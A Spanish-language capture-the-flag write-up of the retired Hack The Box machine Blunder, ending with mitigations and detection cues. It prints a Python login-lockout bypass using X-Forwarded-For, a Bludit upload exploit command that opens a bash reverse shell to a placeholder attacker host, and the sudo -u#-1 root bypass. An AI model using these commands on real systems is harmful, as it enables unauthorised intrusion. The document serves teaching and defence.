---
machine: Blunder
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, bludit, cve, bruteforce, sudo]
---

# Blunder — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Bludit 3.9.2 en un Apache sin SSH ni FTP. Un `todo.txt` regala el usuario `fergus` y el panel confirma la versión. El control de intentos se salta con `X-Forwarded-For` (CVE-2019-17240) y una wordlist generada con CeWL encuentra la contraseña. Con sesión, la subida de imágenes permite path traversal en `uuid` (CVE-2019-16113) y acaba en RCE. Dentro, un segundo Bludit (3.10.0a) guarda el hash SHA-1 de `hugo`, y `sudo` con `(ALL, !root)` cae por CVE-2019-14287 con `sudo -u#-1`.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
80/tcp  open  http  Apache httpd 2.4.41 ((Ubuntu))
```

Sin SSH: toda la superficie es web. El generador del HTML apunta a Bludit.

## Enumeración

```bash
gobuster dir -u http://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html -t 50
```

```text
/admin        (301)
/install.php  (200)  "Bludit is already installed ;)"
/todo.txt     (200)
/LICENSE      (200)
```

```text
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Usuario: `fergus`. En el HTML de `/admin/` aparece `version=3.9.2`.

```bash
sudo cewl -d 3 -m 5 http://<IP>/ > cewl.txt
wc -l cewl.txt
```

## Foothold

CVE-2019-17240: el bloqueo por intentos se basa en la IP del cliente, que se toma de `X-Forwarded-For`. Si se envía un valor distinto en cada petición, el contador nunca sube.

```python
import requests, re

url = "http://<IP>/admin/login.php"
s = requests.Session()
r = s.get(url)
token = re.search(r'name="tokenCSRF" value="(.*?)"', r.text).group(1)
data = {"tokenCSRF": token, "username": "fergus", "password": pw}
r = s.post(url, data=data, headers={"X-Forwarded-For": pw}, allow_redirects=False)
ok = "/admin/dashboard" in r.headers.get("Location", "")
```

Con `cewl.txt` sale `fergus:<password>`.

CVE-2019-16113: la subida de imágenes no valida `uuid`, así que se escribe fuera de `bl-content/uploads` y se fuerza a Apache a ejecutar la imagen como PHP con un `.htaccess`:

```bash
python3 48568.py -u http://<IP> -user fergus -pass '<password>' \
  -c "bash -c 'bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1'"
```

Shell como `www-data`.

## Escalada

```bash
cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
```

```json
"admin": { "nickname": "Hugo", "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d" }
```

SHA-1 sin sal: se rompe en cualquier diccionario o en CrackStation.

```bash
su hugo
```

```bash
sudo -l
# (ALL, !root) /bin/bash
```

CVE-2019-14287: en sudo < 1.8.28 el UID `-1` se interpreta como `4294967295` y acaba resolviendo a root, saltándose el `!root`:

```bash
sudo -u#-1 /bin/bash
```

## Evidencia

- `id` → `www-data`, `hugo` y `root`.
- `users.php` con hash redactado.
- Lectura de `user.txt` y `root.txt` (redactados).

## Lecciones aprendidas

- Los `.txt` del webroot (notas, TODOs) filtran usuarios y pistas de operación.
- CeWL es más eficaz que rockyou cuando el CMS usa contraseñas del propio contenido.
- El bloqueo por IP se evade trivialmente si la IP viene de una cabecera que controla el cliente.
- En el servidor había dos instalaciones de Bludit: la credencial estaba en la que no se explotó.
- `(ALL, !root)` no es una restricción: es una CVE si sudo está sin parchear.

## Mitigaciones y detección

- Actualizar Bludit (3.9.3 corrige el bypass de fuerza bruta; 3.10+ la subida).
- No confiar en `X-Forwarded-For` salvo detrás de un proxy propio que lo reescriba; limitar intentos por cuenta.
- Validar el parámetro `uuid` y servir las subidas desde un directorio sin ejecución.
- Actualizar sudo a >= 1.8.28 y no usar reglas `(ALL, !root)`.
- Detección: muchos POST a `/admin/login.php` con `X-Forwarded-For` variable, `.htaccess` en directorios de subida, `sudo -u#-1`.
- MITRE: T1110.003, T1190, T1548.003.

## Referencias

- CVE-2019-17240, CVE-2019-16113, CVE-2019-14287.
- MITRE ATT&CK: T1110.003, T1190.
